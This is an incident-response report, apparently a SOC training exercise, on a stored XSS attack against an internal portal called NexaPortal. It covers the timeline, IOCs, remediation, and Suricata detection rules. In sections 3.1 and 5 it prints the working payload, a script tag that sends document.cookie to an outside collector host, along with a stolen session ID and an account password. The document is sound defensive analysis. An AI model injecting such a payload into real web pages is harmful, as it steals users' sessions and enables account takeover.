# Incident Findings Report: INC-2026-006

**Client:** NexaCorp Industries
**System:** NexaPortal (bru-web-02), 192.168.10.24
**Incident type:** Stored Cross-Site Scripting (XSS) leading to session hijacking
**Date of incident:** Wednesday, 18 June 2026
**Reported by:** Marc Wauters, IT Infrastructure Manager
**Analyst:** Johan-Emmanuel Hatchi, BeCode Corp SOC
**Classification:** Confidential

---

## 1. Executive summary

On 18 June 2026, an external attacker compromised an employee session on NexaCorp's internal web portal, NexaPortal. The attacker submitted a malicious feedback entry that contained hidden JavaScript. Because the portal stored and displayed that feedback without sanitizing it, the script ran automatically in the browser of an employee who later viewed the page. The script silently copied that employee's session identifier and sent it to a server controlled by the attacker.

Using the stolen session, the attacker accessed the portal as the legitimate employee, without ever needing a password. Investigation also revealed an unauthorized account inside the portal that does not correspond to any NexaCorp employee. The root cause is the absence of input sanitization and output encoding on the feedback feature. The portal was launched two weeks earlier without a security review.

This report documents the full attack chain with evidence, lists the indicators of compromise, and provides remediation steps. All six investigation questions are answered in sections 3 to 6.

---

## 2. Incident timeline

All timestamps below are taken from evidence files. The Apache access log records time in UTC. Local time (CEST) is UTC plus two hours. Both are shown to avoid ambiguity.

| Time (UTC) | Time (CEST) | Event | Source |
|-----------|-------------|-------|--------|
| 08:32:25 | 10:32:25 | First contact: attacker 91.92.100.45 begins reconnaissance with GET /portal/ | web_access.log |
| 15:30:48 | 17:30:48 | Attacker submits XSS payload via POST /portal/feedback.php | web_access.log, attack.pcap |
| 15:45:54 | 17:45:54 | Victim p.dumont authenticates from workstation 192.168.10.110 | web_access.log, attack.pcap |
| 15:50:58 | 17:50:58 | Victim loads feedback page, stored script executes | web_access.log |
| 15:51:00 | 17:51:00 | Beacon fires: victim browser sends session cookie to 91.92.100.45:8080 | attack.pcap |
| ~15:52 | ~17:52 | Attacker reuses stolen session from 91.92.100.45 | web_access.log |

Note on the README discrepancy: the evidence bundle README listed reconnaissance starting around 17:30 CEST. The access log proves the first attacker contact occurred far earlier, at 08:32:25 UTC (10:32:25 CEST). The real compromise window is several hours wider than initially reported.

---

## 3. Technical analysis

### 3.1 The injection (what was planted, where)

The attacker submitted a feedback entry to `POST /portal/feedback.php`. Instead of normal text, the body contained a script tag. The payload, recovered from the POST body in the network capture and URL-decoded, was:

```
comment=<script>fetch('http://91.92.100.45:8080/collect?c='+btoa(document.cookie))</script>
```

NexaPortal accepted this input, stored it in its database, and later rendered it back into the feedback page without encoding it. This is the defining characteristic of a stored (persistent) XSS vulnerability: the malicious code is saved server-side and served to every subsequent visitor.

### 3.2 The trigger (how it executed)

When employee p.dumont opened the feedback page at 15:50:58 UTC, the browser parsed the stored script as live code rather than as text. The script executed in the security context of p.dumont's authenticated session.

### 3.3 The exfiltration (what was sent)

The injected script performed three actions in sequence:

1. `document.cookie` read the victim's active session cookie.
2. `btoa(...)` encoded that cookie value in Base64 to obscure it in transit.
3. `fetch('http://91.92.100.45:8080/collect?c=...')` sent the encoded cookie as an outbound HTTP request to the attacker's collection server.

The beacon fired at 15:51:00 UTC. The exfiltrated value, recovered from the beacon URL and Base64-decoded, was:

```
PHPSESSID=5e81c7a60ec649201724184a1996dae8
```

### 3.4 The session reuse (impact)

With the stolen `PHPSESSID`, the attacker replayed the session from external IP 91.92.100.45 and accessed the portal as p.dumont, with no password required. The login POST bodies captured in the network traffic also revealed an account that authenticated from the attacker IP and does not match any NexaCorp employee record: `m.renard`. The legitimate employee accounts observed were `t.lambert` and `p.dumont`.

The status of `m.renard` warrants a precise statement of fact rather than a firm conclusion. What is proven: the account authenticated from the attacker IP, and it appears in no NexaCorp employee directory. Its password (`Renard2026!`) follows the same naming pattern as legitimate accounts (`Lambert2026!`), which leaves two hypotheses open. Either the attacker created this account inside the portal as a foothold, or it is a pre-existing account (for example a forgotten test account) that was compromised and reused. Both readings support the same action: the account must be treated as unauthorized, investigated, and removed. The investigation does not have sufficient evidence to assert which hypothesis is correct.

A behavioral indicator reinforced attribution throughout: all attacker activity used a Firefox on Linux user agent, while the legitimate NexaCorp workstation fleet uses Chrome and Edge on Windows.

---

## 4. Answers to investigation questions

1. **External IP and port receiving outbound connections:** 91.92.100.45 on port 8080.
2. **Page used to trigger the connections:** the feedback feature, `feedback.php`, abused through a stored XSS payload that beacons on page load.
3. **Attack type and what was injected:** stored Cross-Site Scripting. The attacker injected a `<script>` tag that reads `document.cookie`, encodes it with `btoa`, and sends it to the collector.
4. **Account targeted and data exfiltrated:** the targeted account was p.dumont. The exfiltrated data was the session cookie `PHPSESSID=5e81c7a60ec649201724184a1996dae8`.
5. **Anomalous account:** `m.renard`, which authenticated from the attacker IP and matches no NexaCorp employee directory entry. Its origin is not fully established (attacker-created foothold, or compromised pre-existing account); in both cases it must be treated as unauthorized and removed.
6. **Remediation:** see section 7.

---

## 5. Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| Attacker IP | 91.92.100.45 |
| Collector port | 8080 |
| Collector endpoint | /collect |
| Beacon URL pattern | http://91.92.100.45:8080/collect?c=<base64> |
| Injection vector | POST /portal/feedback.php |
| XSS payload | `<script>fetch('http://91.92.100.45:8080/collect?c='+btoa(document.cookie))</script>` |
| Victim account | p.dumont |
| Victim workstation | 192.168.10.110 |
| Stolen session cookie | PHPSESSID=5e81c7a60ec649201724184a1996dae8 |
| Unauthorized account | m.renard (origin undetermined, see 3.4) |
| Attacker user agent | Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0 |

---

## 6. Attack chain

```
1. Recon          attacker 91.92.100.45 probes /portal/ (08:32 UTC)
2. Injection      POST /portal/feedback.php with <script> payload (15:30 UTC)
3. Storage        NexaPortal saves the payload unsanitized in its database
4. Trigger        victim p.dumont loads the feedback page (15:50:58 UTC)
5. Execution      stored script runs in p.dumont's authenticated browser
6. Encoding       btoa(document.cookie) Base64-encodes the session cookie
7. Exfiltration   fetch() beacons the cookie to 91.92.100.45:8080/collect (15:51:00 UTC)
8. Hijack         attacker replays PHPSESSID, accesses portal as p.dumont (~15:52 UTC)
```

---

## 7. Remediation recommendations

1. **Sanitize input and encode output on the feedback feature (and portal-wide).** Apply context-aware output encoding so that any stored content is rendered as text, never executed as code. This directly removes the stored XSS vulnerability that enabled the entire chain. Treat all user-supplied input as untrusted across every NexaPortal feature, not only feedback.

2. **Harden session cookies.** Set the `HttpOnly` flag so that JavaScript cannot read `document.cookie`. With `HttpOnly` in place, the exact exfiltration used here would have failed even if the script executed. Add the `Secure` and `SameSite` attributes, and rotate session identifiers on authentication.

3. **Invalidate the compromised session and remove the rogue account.** Force-expire `PHPSESSID=5e81c7a60ec649201724184a1996dae8`, reset p.dumont's credentials, and delete the unauthorized `m.renard` account. Audit the account directory for any other entries that do not map to a known employee.

4. **Add egress filtering and outbound monitoring.** The portal server should not be able to initiate, and clients should not be able to reach, arbitrary external hosts on non-standard ports such as 8080. Block and alert on outbound traffic to unrecognized destinations.

5. **Deploy the detection rules from this investigation.** The two Suricata rules in `detection/` (XSS injection in the feedback body, and the cookie exfiltration beacon) detect this attack pattern automatically. See section 8.

6. **Require a security review before launch.** NexaPortal went live without testing. Add a mandatory pre-production security assessment, including input validation and authenticated session handling, to the deployment process.

---

## 8. Detection engineering

Two Suricata rules were written and validated by replaying the incident capture (`attack_eth.pcap`). The flag for each detection is the number of alerts produced.

### Rule 1: XSS injection in feedback POST (SID 1000001)

```
alert http any any -> any any (msg:"NEXACORP XSS injection in feedback POST"; flow:to_server,established; http.request_body; content:"script"; nocase; sid:1000001; rev:1;)
```

Inspects the HTTP request body for the `script` marker, which appears in the malicious feedback submission but not in legitimate text. Alerts produced: 1.

### Rule 2: Cookie exfiltration beacon to collector (SID 1000002)

```
alert http any any -> 91.92.100.45 8080 (msg:"NEXACORP cookie exfiltration beacon to collector"; flow:to_server,established; http.uri; content:"/collect"; sid:1000002; rev:1;)
```

Targets outbound HTTP requests to the collector IP and port, restricted to the `/collect` endpoint. Alerts produced: 1.

### Full coverage

With both rules active against the capture, total alerts: 2 (one injection, one beacon). This confirms the rule set covers the complete attack chain with no false positives on the captured traffic.

---

*BeCode Corp, Incident Response Division. Classification: Confidential.*
